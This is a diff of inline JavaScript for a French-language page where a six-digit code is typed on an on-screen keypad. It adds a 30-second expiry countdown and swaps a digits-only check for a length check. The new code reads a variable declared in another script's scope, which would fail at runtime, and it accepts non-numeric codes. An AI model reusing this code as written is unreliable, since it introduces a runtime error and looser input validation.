@@ -351,21 +351,23 @@ main {
   <script src="/js/jquery.min.js"></script>
 
 <script>
-  document.querySelector('form').addEventListener('submit', (e) => {
-    e.preventDefault();
+ document.querySelector('form').addEventListener('submit', (e) => {
+  e.preventDefault();
 
-    const code = document.getElementById('hidden-code').value.trim(); // ✅ on lit bien le code saisi via le clavier
-    if (code.match(/^\d{6}$/)) {
-      document.getElementById('success-check').style.display = 'block';
-      document.querySelector('form button[type="submit"]').disabled = true;
+  const code = document.getElementById('hidden-code').value.trim();
 
-      setTimeout(() => {
-        e.target.submit(); // Soumission réelle après animation
-      }, 1500);
-    } else {
-      alert("Veuillez entrer un code à 6 chiffres valide.");
-    }
-  });
+  if (code.length === 6 && countdown > 0) {
+    document.getElementById('success-check').style.display = 'block';
+    document.querySelector('form button[type="submit"]').disabled = true;
+
+    setTimeout(() => {
+      e.target.submit(); // Soumission réelle après animation
+    }, 1500);
+  } else {
+    alert("Le code est invalide ou a expiré. Veuillez recommencer.");
+  }
+});
+
 </script>
 <script>
   document.addEventListener("DOMContentLoaded", function () {
@@ -395,6 +397,24 @@ main {
         keypad.appendChild(btn);
       });
     }
+// ⏳ Démarre le compte à rebours
+let countdown = 30;
+const timerSpan = document.getElementById("timer");
+const submitBtn = document.getElementById("submit-code");
+
+const countdownInterval = setInterval(() => {
+  countdown--;
+  timerSpan.textContent = countdown;
+
+  if (countdown <= 0) {
+    clearInterval(countdownInterval);
+    timerSpan.textContent = "0";
+    submitBtn.disabled = true;
+    submitBtn.textContent = "Code expiré";
+    submitBtn.classList.add("btn-secondary");
+    submitBtn.classList.remove("btn-primary");
+  }
+}, 1000);
 
     function enterDigit(digit) {
       if (hiddenCode.value.length < 6) {
